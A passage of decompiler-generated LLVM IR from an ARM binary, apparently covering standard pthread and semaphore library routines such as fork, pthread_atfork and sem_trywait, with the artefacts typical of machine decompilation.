  %v2_b8bc = icmp eq i32 %v2_b8b8, 0
  store i1 %v2_b8bc, i1* %cpsr_z.global-to-local, align 1
  %tmp67 = icmp slt i32 %v2_b8b8, 1
  br i1 %tmp67, label %dec_label_pc_b294, label %dec_label_pc_b8c4

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b8b4
  %v1_b8c4 = call i32 @__GI_raise(i32 %v2_b8b8)
  store i32 %v1_b8c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v1_b854.ph, { 1, 2, 0 }
  uselistorder i32 %v2_b82c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_b7ec, { 1, 0 }
  uselistorder i32 %v0_b7d8, { 1, 0 }
  uselistorder i32 %v0_b7ec.pre, { 1, 0 }
  uselistorder i32 %v0_b7ac, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b71c, { 1, 0 }
  uselistorder i32 %v0_b770, { 1, 0, 2 }
  uselistorder i32 %v0_b6c4, { 2, 1, 0 }
  uselistorder i32 %v0_b698, { 1, 0 }
  uselistorder i1 %v7_b67c, { 1, 0 }
  uselistorder i32 %v2_b678, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_b558, { 1, 0 }
  uselistorder i32 %v1_b4fc, { 1, 0 }
  uselistorder i32 %v1_b4cc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_b488, { 1, 0, 2, 3 }
  uselistorder i1 %v7_b470, { 1, 0 }
  uselistorder i32 %v3_b448, { 2, 1, 0 }
  uselistorder i32 %v0_b3fc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_b3cc, { 1, 0, 2 }
  uselistorder i1 %v2_b3b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b3b4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_b3a0, { 1, 2, 0, 3, 5, 6, 4 }
  uselistorder i32 %v3_b348, { 1, 0, 2 }
  uselistorder i32 %v3_b328, { 6, 5, 4, 3, 2, 0, 1, 7, 8, 9 }
  uselistorder i1 %v2_b2e8, { 1, 0 }
  uselistorder i32 %v2_b1d8, { 1, 0, 3, 2, 5, 4, 7, 6, 8 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder i32 %tmp55, { 1, 0 }
  uselistorder i32 %tmp49, { 2, 0, 1 }
  uselistorder i32 %tmp48, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 41, 42, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r2.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 52, 53, 7, 6, 9, 8, 11, 10, 12, 13, 14, 19, 15, 16, 18, 17, 20, 22, 23, 25, 21, 24, 27, 26, 29, 28, 30, 31, 32, 34, 33, 35, 37, 36, 38, 44, 39, 40, 41, 42, 43, 46, 45, 48, 47, 1, 49, 50, 51, 54, 55, 56, 58, 57, 59, 60, 62, 61, 64, 63, 65, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 10, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 32, 2, 31, 3, 42, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 19, 20, 21, 22, 23, 24, 25, 26, 43, 28, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32* @global_var_2b034.193, { 0, 3, 1, 2 }
  uselistorder i32 (i32)* @pthread_free, { 1, 0 }
  uselistorder i32* @global_var_2a3c0.207, { 2, 0, 3, 5, 1, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32* @global_var_2b030.191, { 0, 2, 4, 1, 3 }
  uselistorder i32* @global_var_2a608.220, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder label %dec_label_pc_b864, { 1, 0 }
  uselistorder label %dec_label_pc_b840, { 1, 0 }
  uselistorder label %dec_label_pc_b81c, { 1, 0 }
  uselistorder label %dec_label_pc_b77c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_b72c, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_b6d4, { 1, 0 }
  uselistorder label %dec_label_pc_b6ac, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b4d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b4c8, { 1, 0 }
  uselistorder label %dec_label_pc_b42c, { 1, 0 }
  uselistorder label %dec_label_pc_b39c, { 1, 0 }
  uselistorder label %dec_label_pc_b39c.lr.ph, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_b294, { 5, 2, 3, 6, 9, 7, 8, 1, 4, 0, 10 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b234, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
}

define i32 @function_b8f8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b8f8:
  %v0_b8f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b8f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_b8f8
  %v4_b8f8 = call i32 @unknown_0()
  %v8_b8fc = lshr i32 %arg3, %arg2
  %v9_b8fc = and i32 %v4_b8f8, %v8_b8fc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b8f8, %bb
  %v10_b8fc = phi i32 [ %arg1, %dec_label_pc_b8f8 ], [ %v9_b8fc, %bb ]
  ret i32 %v10_b8fc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__pthread_manager_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_b934 = load i32, i32* bitcast (i32** @global_var_2a5dc.258 to i32*), align 4
  %v2_b938 = call i32 @__pthread_lock(i32 %v3_b934, i32 0)
  %v3_b93c = load i32, i32* bitcast (i32** @global_var_2a5dc.258 to i32*), align 4
  %v1_b940 = call i32 @__pthread_unlock(i32 %v3_b93c)
  %v0_b944 = load i32, i32* @r5, align 4
  %v1_b948 = call i32 @__pthread_manager(i32 %v0_b944)
  %v0_b94c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b94c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v1_b948

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_b950 = icmp eq i32 %arg1, 0
  br i1 %v2_b950, label %bb, label %bb5

bb:                                               ; preds = %entry
  %v2_b954 = load i32, i32* @r0, align 4
  ret i32 %v2_b954

bb5:                                              ; preds = %entry
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_b984 = load i32, i32* @r4, align 4
  store i32 %v3_b984, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_b99c2 = icmp eq i32* %arg1, null
  br i1 %v2_b99c2, label %dec_label_pc_b9a4, label %dec_label_pc_b990

dec_label_pc_b990:                                ; preds = %entry, %dec_label_pc_b990
  %v0_b994 = phi i32 [ %v3_b998, %dec_label_pc_b990 ], [ %tmp, %entry ]
  store i32 47512, i32* @lr, align 4
  %v1_b994 = inttoptr i32 %v0_b994 to i32*
  %v2_b994 = load i32, i32* %v1_b994, align 4
  call void @__pseudo_branch(i32 %v2_b994)
  %v0_b998 = load i32, i32* %r4.global-to-local, align 4
  %v1_b998 = add i32 %v0_b998, 4
  %v2_b998 = inttoptr i32 %v1_b998 to i32*
  %v3_b998 = load i32, i32* %v2_b998, align 4
  store i32 %v3_b998, i32* %r4.global-to-local, align 4
  %v2_b99c = icmp eq i32 %v3_b998, 0
  br i1 %v2_b99c, label %dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge, label %dec_label_pc_b990

dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge:    ; preds = %dec_label_pc_b990
  %v2_b9a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b9a4

dec_label_pc_b9a4:                                ; preds = %dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge, %entry
  %v2_b9a4 = phi i32 [ %v2_b9a4.pre, %dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge ], [ %v3_b984, %entry ]
  store i32 %v2_b9a4, i32* @r4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_b998, { 2, 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b990, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_b9a8 = load i32, i32* @r4, align 4
  %v6_b9a8 = load i32, i32* @r5, align 4
  %v9_b9a8 = load i32, i32* @r6, align 4
  %v12_b9a8 = load i32, i32* @r7, align 4
  %v15_b9a8 = load i32, i32* @r8, align 4
  store i32 62768, i32* @r4, align 4
  %v2_b9b4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_b9bc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b03c.260 to i32))
  %v2_b9c4 = load i32, i32* @global_var_2b054.263, align 4
  %v2_b9cc = load i32, i32* @global_var_2b058.265, align 4
  store i32 %v2_b9cc, i32* @r8, align 4
  %v2_b9d4 = load i32, i32* @global_var_2b05c.267, align 4
  store i32 %v2_b9d4, i32* @r7, align 4
  %v1_b9d8 = inttoptr i32 %v2_b9c4 to i32*
  %v2_b9d8 = call i32 @pthread_call_handlers(i32* %v1_b9d8)
  %v1_b9dc = call i32 @__pthread_once_fork_prepare(i32 %v2_b9d8)
  %v2_b9e8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f574.269 to i32))
  %v2_b9f4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32))
  %v1_b9f8 = call i32 @__libc_fork(i32 %v2_b9f4)
  store i32 %v1_b9f8, i32* @r5, align 4
  %v2_b9fc = icmp eq i32 %v1_b9f8, 0
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r4, align 4
  store i32 61860, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* @r0, align 4
  br i1 %v2_b9fc, label %dec_label_pc_ba64, label %dec_label_pc_bad4

dec_label_pc_ba64:                                ; preds = %entry
  store i32 %v2_b9b4, i32* @r4, align 4
  store i32 %v2_b9b4, i32* @r7, align 4
  %v3_ba2c = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-28)
  %v0_ba34 = load i32, i32* @r5, align 4
  %v4_ba40 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-28, i32 %v0_ba34)
  %v4_ba50 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* nonnull %stack_var_-28)
  %v2_ba60 = call i32 @pthread_mutexattr_destroy(i32 %v2_b9b4)
  %v0_ba64.pre = load i32, i32* @r5, align 4
  store i32 47732, i32* @lr, align 4
  %v3_ba70 = inttoptr i32 %v0_ba64.pre to i32*
  %v4_ba70 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_2f574.269 to i32), i32* %v3_ba70)
  %v0_ba74 = load i32, i32* @r6, align 4
  %v2_ba74 = icmp eq i32 %v0_ba74, 0
  br i1 %v2_ba74, label %dec_label_pc_bac0, label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba64
  %v3_ba88 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-28)
  %v0_ba90 = load i32, i32* @r5, align 4
  %v4_ba9c = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-28, i32 %v0_ba90)
  %v4_baac = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_2b03c.260 to i32), i32* nonnull %stack_var_-28)
  store i32 47808, i32* @lr, align 4
  %v2_babc = call i32 @pthread_mutexattr_destroy(i32 %v2_b9b4)
  br label %dec_label_pc_bac0

dec_label_pc_bac0:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_ba80
  %v0_bac0 = call i32 @__pthread_reset_main_thread()
  %v1_bac4 = call i32 @__fresetlockfiles(i32 %v0_bac0)
  %v1_bac8 = call i32 @__pthread_once_fork_child(i32 %v1_bac4)
  br label %dec_label_pc_bafc

dec_label_pc_bad4:                                ; preds = %entry
  %v1_bad8 = call i32 @pthread_mutex_unlock()
  store i32 ptrtoint (i32* @global_var_2f574.269 to i32), i32* @r0, align 4
  %v1_bae4 = call i32 @pthread_mutex_unlock()
  store i32 ptrtoint (i32* @global_var_2b03c.260 to i32), i32* @r0, align 4
  store i32 47860, i32* @lr, align 4
  %v1_baf0 = call i32 @pthread_mutex_unlock()
  %v1_baf4 = call i32 @__pthread_once_fork_parent(i32 %v1_baf0)
  br label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bac0, %dec_label_pc_bad4
  %storemerge.in = phi i32* [ @r7, %dec_label_pc_bad4 ], [ @r8, %dec_label_pc_bac0 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_bafc = inttoptr i32 %storemerge to i32*
  %v2_bafc = call i32 @pthread_call_handlers(i32* %v1_bafc)
  %v0_bb00 = load i32, i32* @r5, align 4
  store i32 %v3_b9a8, i32* @r4, align 4
  store i32 %v6_b9a8, i32* @r5, align 4
  store i32 %v9_b9a8, i32* @r6, align 4
  store i32 %v12_b9a8, i32* @r7, align 4
  store i32 %v15_b9a8, i32* @r8, align 4
  ret i32 %v0_bb00

; uselistorder directives
  uselistorder i32 %v2_b9b4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-28, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder label %dec_label_pc_bafc, { 1, 0 }
  uselistorder label %dec_label_pc_bac0, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_bb3c = call i32 @fork()
  ret i32 %v0_bb3c
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_bb54 = call i32 @malloc(i32 24)
  store i32 %v1_bb54, i32* @r4, align 4
  %v2_bb58 = icmp eq i32 %v1_bb54, 0
  br i1 %v2_bb58, label %dec_label_pc_bbc4, label %dec_label_pc_bb68

dec_label_pc_bb68:                                ; preds = %entry
  %v2_bb70 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b03c.260 to i32))
  %v0_bb74 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2b054.263 to i32), i32* @r0, align 4
  %v0_bb7c = load i32, i32* @r4, align 4
  %v4_bb84 = inttoptr i32 %v0_bb74 to i32*
  %v5_bb84 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_2b054.263 to i32), i32* %v4_bb84, i32 %v0_bb7c, i32 0)
  %v0_bb88 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2b05c.267 to i32), i32* @r0, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  %v1_bb90 = add i32 %v0_bb90, 8
  %v4_bb98 = inttoptr i32 %v0_bb88 to i32*
  %v5_bb98 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_2b05c.267 to i32), i32* %v4_bb98, i32 %v1_bb90, i32 1)
  %v0_bb9c = load i32, i32* @r7, align 4
  %v0_bba0 = load i32, i32* @r4, align 4
  %v1_bba0 = add i32 %v0_bba0, 16
  store i32 ptrtoint (i32* @global_var_2b058.265 to i32), i32* @r0, align 4
  %v4_bbac = inttoptr i32 %v0_bb9c to i32*
  %v5_bbac = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_2b058.265 to i32), i32* %v4_bbac, i32 %v1_bba0, i32 1)
  store i32 ptrtoint (i32* @global_var_2b03c.260 to i32), i32* @r0, align 4
  %v1_bbbc = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %entry, %dec_label_pc_bb68
  %v0_bbc4 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_bb68 ]
  ret i32 %v0_bbc4

; uselistorder directives
  uselistorder i32* @global_var_2b058.265, { 1, 0 }
  uselistorder i32* @global_var_2b05c.267, { 1, 0 }
  uselistorder i32* @global_var_2b054.263, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b03c.260 to i32), { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_bbc4, { 1, 0 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v0_bc3c2 = load i32, i32* @r0, align 4
  %v1_bc3c3 = inttoptr i32 %v0_bc3c2 to i32*
  %v2_bc3c4 = load i32, i32* %v1_bc3c3, align 4
  store i32 %v2_bc3c4, i32* %r2.global-to-local, align 4
  %v2_bc406 = icmp eq i32 %v2_bc3c4, 0
  br i1 %v2_bc406, label %dec_label_pc_bc48, label %dec_label_pc_bc18

dec_label_pc_bc18:                                ; preds = %entry, %dec_label_pc_bc38
  %v1_bc28 = phi i32 [ %v1_bc20, %dec_label_pc_bc38 ], [ %v0_bc3c2, %entry ]
  %v0_bc20 = phi i32 [ %v2_bc3c, %dec_label_pc_bc38 ], [ %v2_bc3c4, %entry ]
  %v9_bc18 = icmp eq i32 %v0_bc20, %arg1
  %v1_bc20 = add i32 %v0_bc20, 8
  br i1 %v9_bc18, label %dec_label_pc_bc20, label %dec_label_pc_bc38

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bc18
  %v2_bc20 = inttoptr i32 %v1_bc20 to i32*
  %v3_bc20 = load i32, i32* %v2_bc20, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_bc28 = inttoptr i32 %v1_bc28 to i32*
  store i32 %v3_bc20, i32* %v2_bc28, align 4
  %v1_bc30 = load i32, i32* %r2.global-to-local, align 4
  %v2_bc30 = add i32 %v1_bc30, 8
  %v3_bc30 = inttoptr i32 %v2_bc30 to i32*
  store i32 0, i32* %v3_bc30, align 4
  %v0_bc4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc4c

dec_label_pc_bc38:                                ; preds = %dec_label_pc_bc18
  %v1_bc3c = inttoptr i32 %v1_bc20 to i32*
  %v2_bc3c = load i32, i32* %v1_bc3c, align 4
  store i32 %v2_bc3c, i32* %r2.global-to-local, align 4
  %v2_bc40 = icmp eq i32 %v2_bc3c, 0
  br i1 %v2_bc40, label %dec_label_pc_bc3c.dec_label_pc_bc48_crit_edge, label %dec_label_pc_bc18

dec_label_pc_bc3c.dec_label_pc_bc48_crit_edge:    ; preds = %dec_label_pc_bc38
  br label %dec_label_pc_bc48

dec_label_pc_bc48:                                ; preds = %dec_label_pc_bc3c.dec_label_pc_bc48_crit_edge, %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc4c

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc48
  %v0_bc4c = phi i32 [ %v0_bc4c.pre, %dec_label_pc_bc20 ], [ 0, %dec_label_pc_bc48 ]
  ret i32 %v0_bc4c

; uselistorder directives
  uselistorder i32 %v2_bc3c, { 1, 2, 0 }
  uselistorder i32 %v1_bc20, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bc4c, { 1, 0 }
  uselistorder label %dec_label_pc_bc18, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_bc54 = add i32 %arg1, 8
  %v2_bc54 = inttoptr i32 %v1_bc54 to i32*
  %v3_bc54 = load i32, i32* %v2_bc54, align 4
  store i32 %v3_bc54, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_bc64 = load i32, i32* @r4, align 4
  store i32 %v3_bc64, i32* %stack_var_-12, align 4
  %v9_bc64 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_bc68 = icmp eq i32 %arg2, 0
  %v0_bc6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bc6c, i32* %r4.global-to-local, align 4
  br i1 %v2_bc68, label %dec_label_pc_bc88, label %dec_label_pc_bc78

dec_label_pc_bc78:                                ; preds = %entry
  %v1_bc78 = add i32 %v0_bc6c, 64
  %v2_bc78 = inttoptr i32 %v1_bc78 to i8*
  %v3_bc78 = load i8, i8* %v2_bc78, align 1
  %v2_bc7c = icmp eq i8 %v3_bc78, 0
  br i1 %v2_bc7c, label %dec_label_pc_bc90, label %bb

bb:                                               ; preds = %dec_label_pc_bc78
  store i32 %v3_bc64, i32* @r4, align 4
  ret i32 %v0_bc6c

dec_label_pc_bc88:                                ; preds = %entry
  %v1_bc88 = add i32 %v0_bc6c, 28
  %v2_bc88 = inttoptr i32 %v1_bc88 to i32*
  %v3_bc88 = load i32, i32* %v2_bc88, align 4
  store i32 %v3_bc88, i32* %r0.global-to-local, align 4
  %v2_bc8c = call i32 @__pthread_lock(i32 %v3_bc88, i32 %v0_bc6c)
  store i32 %v2_bc8c, i32* %r0.global-to-local, align 4
  %v0_bc90.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_bc94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bc90

dec_label_pc_bc90:                                ; preds = %dec_label_pc_bc78, %dec_label_pc_bc88
  %v1_bc94 = phi i32 [ %v0_bc6c, %dec_label_pc_bc78 ], [ %v1_bc94.pre, %dec_label_pc_bc88 ]
  %v0_bc94 = phi i32 [ %arg2, %dec_label_pc_bc78 ], [ %v0_bc90.pre, %dec_label_pc_bc88 ]
  %v2_bc90 = icmp eq i32 %v0_bc94, 0
  %v2_bc94 = add i32 %v1_bc94, 444
  %v3_bc94 = inttoptr i32 %v2_bc94 to i32*
  store i32 %v0_bc94, i32* %v3_bc94, align 4
  br i1 %v2_bc90, label %bb7, label %bb6

bb6:                                              ; preds = %dec_label_pc_bc90
  %v3_bc98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_bc98, i32* @r4, align 4
  %v12_bc98 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_bc98

bb7:                                              ; preds = %dec_label_pc_bc90
  %v0_bc9c = load i32, i32* %r4.global-to-local, align 4
  %v1_bc9c = add i32 %v0_bc9c, 28
  %v2_bc9c = inttoptr i32 %v1_bc9c to i32*
  %v3_bc9c = load i32, i32* %v2_bc9c, align 4
  store i32 %v3_bc9c, i32* %r0.global-to-local, align 4
  %v2_bca0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bca0, i32* @r4, align 4
  store i32 %v9_bc64, i32* @lr, align 4
  %v1_bca4 = call i32 @__pthread_unlock(i32 %v3_bc9c)
  store i32 %v1_bca4, i32* %r0.global-to-local, align 4
  ret i32 %v1_bca4

; uselistorder directives
  uselistorder i32 %v0_bc6c, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 6, 4, 0, 1 }
  uselistorder label %dec_label_pc_bc90, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v0_bcac = call i32 @__errno_location()
  %v2_bcb4 = inttoptr i32 %v0_bcac to i32*
  store i32 38, i32* %v2_bcb4, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_bcc4 = call i32 @__errno_location()
  %v2_bccc = inttoptr i32 %v0_bcc4 to i32*
  store i32 38, i32* %v2_bccc, align 4
  ret i32 -1
}

define i32 @sem_open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_bce0 = call i32 @__errno_location()
  %v2_bce8 = inttoptr i32 %v0_bce0 to i32*
  store i32 38, i32* %v2_bce8, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_bcfc = add i32 %arg1, 12
  %v2_bcfc = inttoptr i32 %v1_bcfc to i32*
  %v3_bcfc = load i32, i32* %v2_bcfc, align 4
  %v2_bd00 = icmp eq i32 %v3_bcfc, 0
  br i1 %v2_bd00, label %bb, label %bb2

bb:                                               ; preds = %entry
  ret i32 0

bb2:                                              ; preds = %entry
  %v0_bd10 = call i32 @__errno_location()
  %v2_bd18 = inttoptr i32 %v0_bd10 to i32*
  store i32 16, i32* %v2_bd18, align 4
  ret i32 -1
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_bd24 = load i32, i32* @r4, align 4
  store i32 %v3_bd24, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_bd30 = call i32 @__pthread_lock(i32 %arg1, i32 0)
  %v1_bd34 = add i32 %arg1, 8
  %v2_bd34 = inttoptr i32 %v1_bd34 to i32*
  %v3_bd34 = load i32, i32* %v2_bd34, align 4
  %v2_bd38 = icmp eq i32 %v3_bd34, 0
  store i32 -1, i32* %r5.global-to-local, align 4
  br i1 %v2_bd38, label %dec_label_pc_bd50, label %.thread

.thread:                                          ; preds = %entry
  %v1_bd3c = add i32 %v3_bd34, -1
  store i32 %v1_bd3c, i32* %v2_bd34, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_bd5c

dec_label_pc_bd50:                                ; preds = %entry
  %v0_bd50 = call i32 @__errno_location()
  %v2_bd58 = inttoptr i32 %v0_bd50 to i32*
  store i32 11, i32* %v2_bd58, align 4
  br label %dec_label_pc_bd5c

dec_label_pc_bd5c:                                ; preds = %.thread, %dec_label_pc_bd50
  %v0_bd5c = load i32, i32* %r4.global-to-local, align 4
  %v1_bd60 = call i32 @__pthread_unlock(i32 %v0_bd5c)
  %v0_bd64 = load i32, i32* %r5.global-to-local, align 4
  %v2_bd68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bd68, i32* %r4.global-to-local, align 4
  ret i32 %v0_bd64

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_bd5c, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_bd6c = icmp slt i32 %arg3, 0
  br i1 %v1_bd6c, label %dec_label_pc_bd78, label %dec_label_pc_bd88

dec_label_pc_bd78:                                ; preds = %entry
  %v0_bd78 = call i32 @__errno_location()
  br label %dec_label_pc_bda0

dec_label_pc_bd88:                                ; preds = %entry
  %v2_bd88 = icmp eq i32 %arg2, 0
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br i1 %v2_bd88, label %dec_label_pc_bda8, label %dec_label_pc_bd94

dec_label_pc_bd94:                                ; preds = %dec_label_pc_bd88
  %v0_bd94 = call i32 @__errno_location()
  br label %dec_label_pc_bda0

dec_label_pc_bda0:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bd94
  %storemerge1 = phi i32 [ %v0_bd94, %dec_label_pc_bd94 ], [ %v0_bd78, %dec_label_pc_bd78 ]
  %storemerge = phi i32 [ 38, %dec_label_pc_bd94 ], [ 22, %dec_label_pc_bd78 ]
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_bda0 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_bda0, align 4
  br label %dec_label_pc_bdb8

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bd88
  %v2_bda8 = add i32 %tmp, 8
